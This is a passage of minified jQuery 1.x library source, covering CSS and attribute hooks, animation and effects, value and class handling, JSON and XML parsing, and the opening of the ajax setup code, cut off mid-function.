0!==(ret=hooks.get(elem,!1,extra))?ret:style[name];if(!("string"===(type=typeof value)&&(ret=rcssNum.exec(value))&&ret[1]&&(value=adjustCSS(elem,name,ret),type="number"),null==value||value!=value||("number"===type&&(value+=ret&&ret[3]||(jQuery.cssNumber[origName]?"":"px")),support.clearCloneStyle||""!==value||0!==name.indexOf("background")||(style[name]="inherit"),hooks&&"set"in hooks&&void 0===(value=hooks.set(elem,value,extra)))))try{style[name]=value}catch(e){}}},css:function(elem,name,extra,styles){var num,val,hooks,origName=jQuery.camelCase(name);return name=jQuery.cssProps[origName]||(jQuery.cssProps[origName]=vendorPropName(origName)||origName),(hooks=jQuery.cssHooks[name]||jQuery.cssHooks[origName])&&"get"in hooks&&(val=hooks.get(elem,!0,extra)),void 0===val&&(val=curCSS(elem,name,styles)),"normal"===val&&name in cssNormalTransform&&(val=cssNormalTransform[name]),""===extra||extra?(num=parseFloat(val),!0===extra||isFinite(num)?num||0:val):val}}),jQuery.each(["height","width"],(function(i,name){jQuery.cssHooks[name]={get:function(elem,computed,extra){if(computed)return rdisplayswap.test(jQuery.css(elem,"display"))&&0===elem.offsetWidth?swap(elem,cssShow,(function(){return getWidthOrHeight(elem,name,extra)})):getWidthOrHeight(elem,name,extra)},set:function(elem,value,extra){var styles=extra&&getStyles(elem);return setPositiveNumber(0,value,extra?augmentWidthOrHeight(elem,name,extra,support.boxSizing&&"border-box"===jQuery.css(elem,"boxSizing",!1,styles),styles):0)}}})),support.opacity||(jQuery.cssHooks.opacity={get:function(elem,computed){return ropacity.test((computed&&elem.currentStyle?elem.currentStyle.filter:elem.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":computed?"1":""},set:function(elem,value){var style=elem.style,currentStyle=elem.currentStyle,opacity=jQuery.isNumeric(value)?"alpha(opacity="+100*value+")":"",filter=currentStyle&&currentStyle.filter||style.filter||"";style.zoom=1,(value>=1||""===value)&&""===jQuery.trim(filter.replace(ralpha,""))&&style.removeAttribute&&(style.removeAttribute("filter"),""===value||currentStyle&&!currentStyle.filter)||(style.filter=ralpha.test(filter)?filter.replace(ralpha,opacity):filter+" "+opacity)}}),jQuery.cssHooks.marginRight=addGetHookIf(support.reliableMarginRight,(function(elem,computed){if(computed)return swap(elem,{display:"inline-block"},curCSS,[elem,"marginRight"])})),jQuery.cssHooks.marginLeft=addGetHookIf(support.reliableMarginLeft,(function(elem,computed){if(computed)return(parseFloat(curCSS(elem,"marginLeft"))||(jQuery.contains(elem.ownerDocument,elem)?elem.getBoundingClientRect().left-swap(elem,{marginLeft:0},(function(){return elem.getBoundingClientRect().left})):0))+"px"})),jQuery.each({margin:"",padding:"",border:"Width"},(function(prefix,suffix){jQuery.cssHooks[prefix+suffix]={expand:function(value){for(var i=0,expanded={},parts="string"==typeof value?value.split(" "):[value];i<4;i++)expanded[prefix+cssExpand[i]+suffix]=parts[i]||parts[i-2]||parts[0];return expanded}},rmargin.test(prefix)||(jQuery.cssHooks[prefix+suffix].set=setPositiveNumber)})),jQuery.fn.extend({css:function(name,value){return access(this,(function(elem,name,value){var styles,len,map={},i=0;if(jQuery.isArray(name)){for(styles=getStyles(elem),len=name.length;i<len;i++)map[name[i]]=jQuery.css(elem,name[i],!1,styles);return map}return void 0!==value?jQuery.style(elem,name,value):jQuery.css(elem,name)}),name,value,arguments.length>1)},show:function(){return showHide(this,!0)},hide:function(){return showHide(this)},toggle:function(state){return"boolean"==typeof state?state?this.show():this.hide():this.each((function(){isHidden(this)?jQuery(this).show():jQuery(this).hide()}))}}),jQuery.Tween=Tween,Tween.prototype={constructor:Tween,init:function(elem,options,prop,end,easing,unit){this.elem=elem,this.prop=prop,this.easing=easing||jQuery.easing._default,this.options=options,this.start=this.now=this.cur(),this.end=end,this.unit=unit||(jQuery.cssNumber[prop]?"":"px")},cur:function(){var hooks=Tween.propHooks[this.prop];return hooks&&hooks.get?hooks.get(this):Tween.propHooks._default.get(this)},run:function(percent){var eased,hooks=Tween.propHooks[this.prop];return this.options.duration?this.pos=eased=jQuery.easing[this.easing](percent,this.options.duration*percent,0,1,this.options.duration):this.pos=eased=percent,this.now=(this.end-this.start)*eased+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),hooks&&hooks.set?hooks.set(this):Tween.propHooks._default.set(this),this}},Tween.prototype.init.prototype=Tween.prototype,Tween.propHooks={_default:{get:function(tween){var result;return 1!==tween.elem.nodeType||null!=tween.elem[tween.prop]&&null==tween.elem.style[tween.prop]?tween.elem[tween.prop]:(result=jQuery.css(tween.elem,tween.prop,""))&&"auto"!==result?result:0},set:function(tween){jQuery.fx.step[tween.prop]?jQuery.fx.step[tween.prop](tween):1!==tween.elem.nodeType||null==tween.elem.style[jQuery.cssProps[tween.prop]]&&!jQuery.cssHooks[tween.prop]?tween.elem[tween.prop]=tween.now:jQuery.style(tween.elem,tween.prop,tween.now+tween.unit)}}},Tween.propHooks.scrollTop=Tween.propHooks.scrollLeft={set:function(tween){tween.elem.nodeType&&tween.elem.parentNode&&(tween.elem[tween.prop]=tween.now)}},jQuery.easing={linear:function(p){return p},swing:function(p){return.5-Math.cos(p*Math.PI)/2},_default:"swing"},jQuery.fx=Tween.prototype.init,jQuery.fx.step={};var fxNow,timerId,rfxtypes=/^(?:toggle|show|hide)$/,rrun=/queueHooks$/;function createFxNow(){return window.setTimeout((function(){fxNow=void 0})),fxNow=jQuery.now()}function genFx(type,includeWidth){var which,attrs={height:type},i=0;for(includeWidth=includeWidth?1:0;i<4;i+=2-includeWidth)attrs["margin"+(which=cssExpand[i])]=attrs["padding"+which]=type;return includeWidth&&(attrs.opacity=attrs.width=type),attrs}function createTween(value,prop,animation){for(var tween,collection=(Animation.tweeners[prop]||[]).concat(Animation.tweeners["*"]),index=0,length=collection.length;index<length;index++)if(tween=collection[index].call(animation,prop,value))return tween}function Animation(elem,properties,options){var result,stopped,index=0,length=Animation.prefilters.length,deferred=jQuery.Deferred().always((function(){delete tick.elem})),tick=function(){if(stopped)return!1;for(var currentTime=fxNow||createFxNow(),remaining=Math.max(0,animation.startTime+animation.duration-currentTime),percent=1-(remaining/animation.duration||0),index=0,length=animation.tweens.length;index<length;index++)animation.tweens[index].run(percent);return deferred.notifyWith(elem,[animation,percent,remaining]),percent<1&&length?remaining:(deferred.resolveWith(elem,[animation]),!1)},animation=deferred.promise({elem:elem,props:jQuery.extend({},properties),opts:jQuery.extend(!0,{specialEasing:{},easing:jQuery.easing._default},options),originalProperties:properties,originalOptions:options,startTime:fxNow||createFxNow(),duration:options.duration,tweens:[],createTween:function(prop,end){var tween=jQuery.Tween(elem,animation.opts,prop,end,animation.opts.specialEasing[prop]||animation.opts.easing);return animation.tweens.push(tween),tween},stop:function(gotoEnd){var index=0,length=gotoEnd?animation.tweens.length:0;if(stopped)return this;for(stopped=!0;index<length;index++)animation.tweens[index].run(1);return gotoEnd?(deferred.notifyWith(elem,[animation,1,0]),deferred.resolveWith(elem,[animation,gotoEnd])):deferred.rejectWith(elem,[animation,gotoEnd]),this}}),props=animation.props;for(!function propFilter(props,specialEasing){var index,name,easing,value,hooks;for(index in props)if(easing=specialEasing[name=jQuery.camelCase(index)],value=props[index],jQuery.isArray(value)&&(easing=value[1],value=props[index]=value[0]),index!==name&&(props[name]=value,delete props[index]),(hooks=jQuery.cssHooks[name])&&"expand"in hooks)for(index in value=hooks.expand(value),delete props[name],value)index in props||(props[index]=value[index],specialEasing[index]=easing);else specialEasing[name]=easing}(props,animation.opts.specialEasing);index<length;index++)if(result=Animation.prefilters[index].call(animation,elem,props,animation.opts))return jQuery.isFunction(result.stop)&&(jQuery._queueHooks(animation.elem,animation.opts.queue).stop=jQuery.proxy(result.stop,result)),result;return jQuery.map(props,createTween,animation),jQuery.isFunction(animation.opts.start)&&animation.opts.start.call(elem,animation),jQuery.fx.timer(jQuery.extend(tick,{elem:elem,anim:animation,queue:animation.opts.queue})),animation.progress(animation.opts.progress).done(animation.opts.done,animation.opts.complete).fail(animation.opts.fail).always(animation.opts.always)}jQuery.Animation=jQuery.extend(Animation,{tweeners:{"*":[function(prop,value){var tween=this.createTween(prop,value);return adjustCSS(tween.elem,prop,rcssNum.exec(value),tween),tween}]},tweener:function(props,callback){jQuery.isFunction(props)?(callback=props,props=["*"]):props=props.match(rnotwhite);for(var prop,index=0,length=props.length;index<length;index++)prop=props[index],Animation.tweeners[prop]=Animation.tweeners[prop]||[],Animation.tweeners[prop].unshift(callback)},prefilters:[function defaultPrefilter(elem,props,opts){var prop,value,toggle,tween,hooks,oldfire,display,anim=this,orig={},style=elem.style,hidden=elem.nodeType&&isHidden(elem),dataShow=jQuery._data(elem,"fxshow");for(prop in opts.queue||(null==(hooks=jQuery._queueHooks(elem,"fx")).unqueued&&(hooks.unqueued=0,oldfire=hooks.empty.fire,hooks.empty.fire=function(){hooks.unqueued||oldfire()}),hooks.unqueued++,anim.always((function(){anim.always((function(){hooks.unqueued--,jQuery.queue(elem,"fx").length||hooks.empty.fire()}))}))),1===elem.nodeType&&("height"in props||"width"in props)&&(opts.overflow=[style.overflow,style.overflowX,style.overflowY],"inline"===("none"===(display=jQuery.css(elem,"display"))?jQuery._data(elem,"olddisplay")||defaultDisplay(elem.nodeName):display)&&"none"===jQuery.css(elem,"float")&&(support.inlineBlockNeedsLayout&&"inline"!==defaultDisplay(elem.nodeName)?style.zoom=1:style.display="inline-block")),opts.overflow&&(style.overflow="hidden",support.shrinkWrapBlocks()||anim.always((function(){style.overflow=opts.overflow[0],style.overflowX=opts.overflow[1],style.overflowY=opts.overflow[2]}))),props)if(value=props[prop],rfxtypes.exec(value)){if(delete props[prop],toggle=toggle||"toggle"===value,value===(hidden?"hide":"show")){if("show"!==value||!dataShow||void 0===dataShow[prop])continue;hidden=!0}orig[prop]=dataShow&&dataShow[prop]||jQuery.style(elem,prop)}else display=void 0;if(jQuery.isEmptyObject(orig))"inline"===("none"===display?defaultDisplay(elem.nodeName):display)&&(style.display=display);else for(prop in dataShow?"hidden"in dataShow&&(hidden=dataShow.hidden):dataShow=jQuery._data(elem,"fxshow",{}),toggle&&(dataShow.hidden=!hidden),hidden?jQuery(elem).show():anim.done((function(){jQuery(elem).hide()})),anim.done((function(){var prop;for(prop in jQuery._removeData(elem,"fxshow"),orig)jQuery.style(elem,prop,orig[prop])})),orig)tween=createTween(hidden?dataShow[prop]:0,prop,anim),prop in dataShow||(dataShow[prop]=tween.start,hidden&&(tween.end=tween.start,tween.start="width"===prop||"height"===prop?1:0))}],prefilter:function(callback,prepend){prepend?Animation.prefilters.unshift(callback):Animation.prefilters.push(callback)}}),jQuery.speed=function(speed,easing,fn){var opt=speed&&"object"==typeof speed?jQuery.extend({},speed):{complete:fn||!fn&&easing||jQuery.isFunction(speed)&&speed,duration:speed,easing:fn&&easing||easing&&!jQuery.isFunction(easing)&&easing};return opt.duration=jQuery.fx.off?0:"number"==typeof opt.duration?opt.duration:opt.duration in jQuery.fx.speeds?jQuery.fx.speeds[opt.duration]:jQuery.fx.speeds._default,null!=opt.queue&&!0!==opt.queue||(opt.queue="fx"),opt.old=opt.complete,opt.complete=function(){jQuery.isFunction(opt.old)&&opt.old.call(this),opt.queue&&jQuery.dequeue(this,opt.queue)},opt},jQuery.fn.extend({fadeTo:function(speed,to,easing,callback){return this.filter(isHidden).css("opacity",0).show().end().animate({opacity:to},speed,easing,callback)},animate:function(prop,speed,easing,callback){var empty=jQuery.isEmptyObject(prop),optall=jQuery.speed(speed,easing,callback),doAnimation=function(){var anim=Animation(this,jQuery.extend({},prop),optall);(empty||jQuery._data(this,"finish"))&&anim.stop(!0)};return doAnimation.finish=doAnimation,empty||!1===optall.queue?this.each(doAnimation):this.queue(optall.queue,doAnimation)},stop:function(type,clearQueue,gotoEnd){var stopQueue=function(hooks){var stop=hooks.stop;delete hooks.stop,stop(gotoEnd)};return"string"!=typeof type&&(gotoEnd=clearQueue,clearQueue=type,type=void 0),clearQueue&&!1!==type&&this.queue(type||"fx",[]),this.each((function(){var dequeue=!0,index=null!=type&&type+"queueHooks",timers=jQuery.timers,data=jQuery._data(this);if(index)data[index]&&data[index].stop&&stopQueue(data[index]);else for(index in data)data[index]&&data[index].stop&&rrun.test(index)&&stopQueue(data[index]);for(index=timers.length;index--;)timers[index].elem!==this||null!=type&&timers[index].queue!==type||(timers[index].anim.stop(gotoEnd),dequeue=!1,timers.splice(index,1));!dequeue&&gotoEnd||jQuery.dequeue(this,type)}))},finish:function(type){return!1!==type&&(type=type||"fx"),this.each((function(){var index,data=jQuery._data(this),queue=data[type+"queue"],hooks=data[type+"queueHooks"],timers=jQuery.timers,length=queue?queue.length:0;for(data.finish=!0,jQuery.queue(this,type,[]),hooks&&hooks.stop&&hooks.stop.call(this,!0),index=timers.length;index--;)timers[index].elem===this&&timers[index].queue===type&&(timers[index].anim.stop(!0),timers.splice(index,1));for(index=0;index<length;index++)queue[index]&&queue[index].finish&&queue[index].finish.call(this);delete data.finish}))}}),jQuery.each(["toggle","show","hide"],(function(i,name){var cssFn=jQuery.fn[name];jQuery.fn[name]=function(speed,easing,callback){return null==speed||"boolean"==typeof speed?cssFn.apply(this,arguments):this.animate(genFx(name,!0),speed,easing,callback)}})),jQuery.each({slideDown:genFx("show"),slideUp:genFx("hide"),slideToggle:genFx("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},(function(name,props){jQuery.fn[name]=function(speed,easing,callback){return this.animate(props,speed,easing,callback)}})),jQuery.timers=[],jQuery.fx.tick=function(){var timer,timers=jQuery.timers,i=0;for(fxNow=jQuery.now();i<timers.length;i++)(timer=timers[i])()||timers[i]!==timer||timers.splice(i--,1);timers.length||jQuery.fx.stop(),fxNow=void 0},jQuery.fx.timer=function(timer){jQuery.timers.push(timer),timer()?jQuery.fx.start():jQuery.timers.pop()},jQuery.fx.interval=13,jQuery.fx.start=function(){timerId||(timerId=window.setInterval(jQuery.fx.tick,jQuery.fx.interval))},jQuery.fx.stop=function(){window.clearInterval(timerId),timerId=null},jQuery.fx.speeds={slow:600,fast:200,_default:400},jQuery.fn.delay=function(time,type){return time=jQuery.fx&&jQuery.fx.speeds[time]||time,type=type||"fx",this.queue(type,(function(next,hooks){var timeout=window.setTimeout(next,time);hooks.stop=function(){window.clearTimeout(timeout)}}))},function(){var a,input=document.createElement("input"),div=document.createElement("div"),select=document.createElement("select"),opt=select.appendChild(document.createElement("option"));(div=document.createElement("div")).setAttribute("className","t"),div.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",a=div.getElementsByTagName("a")[0],input.setAttribute("type","checkbox"),div.appendChild(input),(a=div.getElementsByTagName("a")[0]).style.cssText="top:1px",support.getSetAttribute="t"!==div.className,support.style=/top/.test(a.getAttribute("style")),support.hrefNormalized="/a"===a.getAttribute("href"),support.checkOn=!!input.value,support.optSelected=opt.selected,support.enctype=!!document.createElement("form").enctype,select.disabled=!0,support.optDisabled=!opt.disabled,(input=document.createElement("input")).setAttribute("value",""),support.input=""===input.getAttribute("value"),input.value="t",input.setAttribute("type","radio"),support.radioValue="t"===input.value}();var rreturn=/\r/g,rspaces=/[\x20\t\r\n\f]+/g;jQuery.fn.extend({val:function(value){var hooks,ret,isFunction,elem=this[0];return arguments.length?(isFunction=jQuery.isFunction(value),this.each((function(i){var val;1===this.nodeType&&(null==(val=isFunction?value.call(this,i,jQuery(this).val()):value)?val="":"number"==typeof val?val+="":jQuery.isArray(val)&&(val=jQuery.map(val,(function(value){return null==value?"":value+""}))),(hooks=jQuery.valHooks[this.type]||jQuery.valHooks[this.nodeName.toLowerCase()])&&"set"in hooks&&void 0!==hooks.set(this,val,"value")||(this.value=val))}))):elem?(hooks=jQuery.valHooks[elem.type]||jQuery.valHooks[elem.nodeName.toLowerCase()])&&"get"in hooks&&void 0!==(ret=hooks.get(elem,"value"))?ret:"string"==typeof(ret=elem.value)?ret.replace(rreturn,""):null==ret?"":ret:void 0}}),jQuery.extend({valHooks:{option:{get:function(elem){var val=jQuery.find.attr(elem,"value");return null!=val?val:jQuery.trim(jQuery.text(elem)).replace(rspaces," ")}},select:{get:function(elem){for(var value,option,options=elem.options,index=elem.selectedIndex,one="select-one"===elem.type||index<0,values=one?null:[],max=one?index+1:options.length,i=index<0?max:one?index:0;i<max;i++)if(((option=options[i]).selected||i===index)&&(support.optDisabled?!option.disabled:null===option.getAttribute("disabled"))&&(!option.parentNode.disabled||!jQuery.nodeName(option.parentNode,"optgroup"))){if(value=jQuery(option).val(),one)return value;values.push(value)}return values},set:function(elem,value){for(var optionSet,option,options=elem.options,values=jQuery.makeArray(value),i=options.length;i--;)if(option=options[i],jQuery.inArray(jQuery.valHooks.option.get(option),values)>-1)try{option.selected=optionSet=!0}catch(_){option.scrollHeight}else option.selected=!1;return optionSet||(elem.selectedIndex=-1),options}}}}),jQuery.each(["radio","checkbox"],(function(){jQuery.valHooks[this]={set:function(elem,value){if(jQuery.isArray(value))return elem.checked=jQuery.inArray(jQuery(elem).val(),value)>-1}},support.checkOn||(jQuery.valHooks[this].get=function(elem){return null===elem.getAttribute("value")?"on":elem.value})}));var nodeHook,boolHook,attrHandle=jQuery.expr.attrHandle,ruseDefault=/^(?:checked|selected)$/i,getSetAttribute=support.getSetAttribute,getSetInput=support.input;jQuery.fn.extend({attr:function(name,value){return access(this,jQuery.attr,name,value,arguments.length>1)},removeAttr:function(name){return this.each((function(){jQuery.removeAttr(this,name)}))}}),jQuery.extend({attr:function(elem,name,value){var ret,hooks,nType=elem.nodeType;if(3!==nType&&8!==nType&&2!==nType)return void 0===elem.getAttribute?jQuery.prop(elem,name,value):(1===nType&&jQuery.isXMLDoc(elem)||(name=name.toLowerCase(),hooks=jQuery.attrHooks[name]||(jQuery.expr.match.bool.test(name)?boolHook:nodeHook)),void 0!==value?null===value?void jQuery.removeAttr(elem,name):hooks&&"set"in hooks&&void 0!==(ret=hooks.set(elem,value,name))?ret:(elem.setAttribute(name,value+""),value):hooks&&"get"in hooks&&null!==(ret=hooks.get(elem,name))?ret:null==(ret=jQuery.find.attr(elem,name))?void 0:ret)},attrHooks:{type:{set:function(elem,value){if(!support.radioValue&&"radio"===value&&jQuery.nodeName(elem,"input")){var val=elem.value;return elem.setAttribute("type",value),val&&(elem.value=val),value}}}},removeAttr:function(elem,value){var name,propName,i=0,attrNames=value&&value.match(rnotwhite);if(attrNames&&1===elem.nodeType)for(;name=attrNames[i++];)propName=jQuery.propFix[name]||name,jQuery.expr.match.bool.test(name)?getSetInput&&getSetAttribute||!ruseDefault.test(name)?elem[propName]=!1:elem[jQuery.camelCase("default-"+name)]=elem[propName]=!1:jQuery.attr(elem,name,""),elem.removeAttribute(getSetAttribute?name:propName)}}),boolHook={set:function(elem,value,name){return!1===value?jQuery.removeAttr(elem,name):getSetInput&&getSetAttribute||!ruseDefault.test(name)?elem.setAttribute(!getSetAttribute&&jQuery.propFix[name]||name,name):elem[jQuery.camelCase("default-"+name)]=elem[name]=!0,name}},jQuery.each(jQuery.expr.match.bool.source.match(/\w+/g),(function(i,name){var getter=attrHandle[name]||jQuery.find.attr;getSetInput&&getSetAttribute||!ruseDefault.test(name)?attrHandle[name]=function(elem,name,isXML){var ret,handle;return isXML||(handle=attrHandle[name],attrHandle[name]=ret,ret=null!=getter(elem,name,isXML)?name.toLowerCase():null,attrHandle[name]=handle),ret}:attrHandle[name]=function(elem,name,isXML){if(!isXML)return elem[jQuery.camelCase("default-"+name)]?name.toLowerCase():null}})),getSetInput&&getSetAttribute||(jQuery.attrHooks.value={set:function(elem,value,name){if(!jQuery.nodeName(elem,"input"))return nodeHook&&nodeHook.set(elem,value,name);elem.defaultValue=value}}),getSetAttribute||(nodeHook={set:function(elem,value,name){var ret=elem.getAttributeNode(name);if(ret||elem.setAttributeNode(ret=elem.ownerDocument.createAttribute(name)),ret.value=value+="","value"===name||value===elem.getAttribute(name))return value}},attrHandle.id=attrHandle.name=attrHandle.coords=function(elem,name,isXML){var ret;if(!isXML)return(ret=elem.getAttributeNode(name))&&""!==ret.value?ret.value:null},jQuery.valHooks.button={get:function(elem,name){var ret=elem.getAttributeNode(name);if(ret&&ret.specified)return ret.value},set:nodeHook.set},jQuery.attrHooks.contenteditable={set:function(elem,value,name){nodeHook.set(elem,""!==value&&value,name)}},jQuery.each(["width","height"],(function(i,name){jQuery.attrHooks[name]={set:function(elem,value){if(""===value)return elem.setAttribute(name,"auto"),value}}}))),support.style||(jQuery.attrHooks.style={get:function(elem){return elem.style.cssText||void 0},set:function(elem,value){return elem.style.cssText=value+""}});var rfocusable=/^(?:input|select|textarea|button|object)$/i,rclickable=/^(?:a|area)$/i;jQuery.fn.extend({prop:function(name,value){return access(this,jQuery.prop,name,value,arguments.length>1)},removeProp:function(name){return name=jQuery.propFix[name]||name,this.each((function(){try{this[name]=void 0,delete this[name]}catch(e){}}))}}),jQuery.extend({prop:function(elem,name,value){var ret,hooks,nType=elem.nodeType;if(3!==nType&&8!==nType&&2!==nType)return 1===nType&&jQuery.isXMLDoc(elem)||(name=jQuery.propFix[name]||name,hooks=jQuery.propHooks[name]),void 0!==value?hooks&&"set"in hooks&&void 0!==(ret=hooks.set(elem,value,name))?ret:elem[name]=value:hooks&&"get"in hooks&&null!==(ret=hooks.get(elem,name))?ret:elem[name]},propHooks:{tabIndex:{get:function(elem){var tabindex=jQuery.find.attr(elem,"tabindex");return tabindex?parseInt(tabindex,10):rfocusable.test(elem.nodeName)||rclickable.test(elem.nodeName)&&elem.href?0:-1}}},propFix:{for:"htmlFor",class:"className"}}),support.hrefNormalized||jQuery.each(["href","src"],(function(i,name){jQuery.propHooks[name]={get:function(elem){return elem.getAttribute(name,4)}}})),support.optSelected||(jQuery.propHooks.selected={get:function(elem){var parent=elem.parentNode;return parent&&(parent.selectedIndex,parent.parentNode&&parent.parentNode.selectedIndex),null},set:function(elem){var parent=elem.parentNode;parent&&(parent.selectedIndex,parent.parentNode&&parent.parentNode.selectedIndex)}}),jQuery.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],(function(){jQuery.propFix[this.toLowerCase()]=this})),support.enctype||(jQuery.propFix.enctype="encoding");var rclass=/[\t\r\n\f]/g;function getClass(elem){return jQuery.attr(elem,"class")||""}jQuery.fn.extend({addClass:function(value){var classes,elem,cur,curValue,clazz,j,finalValue,i=0;if(jQuery.isFunction(value))return this.each((function(j){jQuery(this).addClass(value.call(this,j,getClass(this)))}));if("string"==typeof value&&value)for(classes=value.match(rnotwhite)||[];elem=this[i++];)if(curValue=getClass(elem),cur=1===elem.nodeType&&(" "+curValue+" ").replace(rclass," ")){for(j=0;clazz=classes[j++];)cur.indexOf(" "+clazz+" ")<0&&(cur+=clazz+" ");curValue!==(finalValue=jQuery.trim(cur))&&jQuery.attr(elem,"class",finalValue)}return this},removeClass:function(value){var classes,elem,cur,curValue,clazz,j,finalValue,i=0;if(jQuery.isFunction(value))return this.each((function(j){jQuery(this).removeClass(value.call(this,j,getClass(this)))}));if(!arguments.length)return this.attr("class","");if("string"==typeof value&&value)for(classes=value.match(rnotwhite)||[];elem=this[i++];)if(curValue=getClass(elem),cur=1===elem.nodeType&&(" "+curValue+" ").replace(rclass," ")){for(j=0;clazz=classes[j++];)for(;cur.indexOf(" "+clazz+" ")>-1;)cur=cur.replace(" "+clazz+" "," ");curValue!==(finalValue=jQuery.trim(cur))&&jQuery.attr(elem,"class",finalValue)}return this},toggleClass:function(value,stateVal){var type=typeof value;return"boolean"==typeof stateVal&&"string"===type?stateVal?this.addClass(value):this.removeClass(value):jQuery.isFunction(value)?this.each((function(i){jQuery(this).toggleClass(value.call(this,i,getClass(this),stateVal),stateVal)})):this.each((function(){var className,i,self,classNames;if("string"===type)for(i=0,self=jQuery(this),classNames=value.match(rnotwhite)||[];className=classNames[i++];)self.hasClass(className)?self.removeClass(className):self.addClass(className);else void 0!==value&&"boolean"!==type||((className=getClass(this))&&jQuery._data(this,"__className__",className),jQuery.attr(this,"class",className||!1===value?"":jQuery._data(this,"__className__")||""))}))},hasClass:function(selector){var className,elem,i=0;for(className=" "+selector+" ";elem=this[i++];)if(1===elem.nodeType&&(" "+getClass(elem)+" ").replace(rclass," ").indexOf(className)>-1)return!0;return!1}}),jQuery.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),(function(i,name){jQuery.fn[name]=function(data,fn){return arguments.length>0?this.on(name,null,data,fn):this.trigger(name)}})),jQuery.fn.extend({hover:function(fnOver,fnOut){return this.mouseenter(fnOver).mouseleave(fnOut||fnOver)}});var location=window.location,nonce=jQuery.now(),rquery=/\?/,rvalidtokens=/(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;jQuery.parseJSON=function(data){if(window.JSON&&window.JSON.parse)return window.JSON.parse(data+"");var requireNonComma,depth=null,str=jQuery.trim(data+"");return str&&!jQuery.trim(str.replace(rvalidtokens,(function(token,comma,open,close){return requireNonComma&&comma&&(depth=0),0===depth?token:(requireNonComma=open||comma,depth+=!close-!open,"")})))?Function("return "+str)():jQuery.error("Invalid JSON: "+data)},jQuery.parseXML=function(data){var xml;if(!data||"string"!=typeof data)return null;try{window.DOMParser?xml=(new window.DOMParser).parseFromString(data,"text/xml"):((xml=new window.ActiveXObject("Microsoft.XMLDOM")).async="false",xml.loadXML(data))}catch(e){xml=void 0}return xml&&xml.documentElement&&!xml.getElementsByTagName("parsererror").length||jQuery.error("Invalid XML: "+data),xml};var rhash=/#.*$/,rts=/([?&])_=[^&]*/,rheaders=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,rnoContent=/^(?:GET|HEAD)$/,rprotocol=/^\/\//,rurl=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,prefilters={},transports={},allTypes="*/".concat("*"),ajaxLocation=location.href,ajaxLocParts=rurl.exec(ajaxLocation.toLowerCase())||[];function addToPrefiltersOrTransports(structure){return function(dataTypeExpression,func){"string"!=typeof dataTypeExpression&&(func=dataTypeExpression,dataTypeExpression="*");var dataType,i=0,dataTypes=dataTypeExpression.toLowerCase().match(rnotwhite)||[];if(jQuery.isFunction(func))for(;dataType=dataTypes[i++];)"+"===dataType.charAt(0)?(dataType=dataType.slice(1)||"*",(structure[dataType]=structure[dataType]||[]).unshift(func)):(structure[dataType]=structure[dataType]||[]).push(func)}}function inspectPrefiltersOrTransports(structure,options,originalOptions,jqXHR){var inspected={},seekingTransport=structure===transports;function inspect(dataType){var selected;return inspected[dataType]=!0,jQuery.each(structure[dataType]||[],(function(_,prefilterOrFactory){var dataTypeOrTransport=prefilterOrFactory(options,originalOptions,jqXHR);return"string"!=typeof dataTypeOrTransport||seekingTransport||inspected[dataTypeOrTransport]?seekingTransport?!(selected=dataTypeOrTransport):void 0:(options.dataTypes.unshift(dataTypeOrTransport),inspect(dataTypeOrTransport),!1)})),selected}return inspect(options.dataTypes[0])||!inspected["*"]&&inspect("*")}function ajaxExtend(target,src){var deep,key,flatOptions=jQuery.ajaxSettings.flatOptions||{};for(key in src)void 0!==src[key]&&((flatOptions[key]?target:deep||(deep={}))[key]=src[key]);return deep&&jQuery.extend(!0,target,deep),target}function getDisplay(elem){return elem.style&&elem.style.display||jQuery.css(elem,"display")}jQuery.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:ajaxLocation,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(ajaxLocParts[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":allTypes,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":jQuery.parseJSON,"text xml":jQuery.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(target,settings){return settings?ajaxExtend(ajaxExtend(target,jQuery.ajaxSettings),settings):ajaxExtend(jQuery.ajaxSettings,target)},ajaxPrefilter:addToPrefiltersOrTransports(prefilters),ajaxTransport:addToPrefiltersOrTransports(transports),ajax:function(url,options){"object"==typeof url&&(options=url,url=void 0),options=options||{};var parts,i,cacheURL,responseHeadersString,timeoutTimer,fireGlobals,transport,responseHeaders,s=jQuery.ajaxSetup({},options),callbackContext=s.context||s,globalEventContext=s.context&&(callbackContext.nodeType||callbackContext.jquery)?jQuery(callbackContext):jQuery.event,deferred=jQuery.Deferred(),completeDeferred=jQuery.Callbacks("once memory"),statusCode=s.statusCode||{},requestHeaders={},requestHeadersNames={},state=0,strAbort="canceled",jqXHR={readyState:0,getResponseHeader:function(key){var match;if(2===state){if(!responseHeaders)for(responseHeaders={};match=rheaders.exec(responseHeadersString);)responseHeaders[match[1].toLowerCase()]=match[2];match=responseHeaders[key.toLowerCase()]}return null==match?null:match},getAllResponseHeaders:function(){return 2===state?responseHeadersString:null},setRequestHeader:function(name,value){var lname=name.toLowerCase();return state||(name=requestHeadersNames[lname]=requestHeadersNames[lname]||name,requestHeaders[name]=value),this},overrideMimeType:function(type){return state||(s.mimeType=type),this},statusCode:function(map){var code;if(map)if(state<2)for(code in map)statusCode[code]=[statusCode[code],map[code]];else jqXHR.always(map[jqXHR.status]);return this},abort:function(statusText){var finalText=statusText||strAbort;return 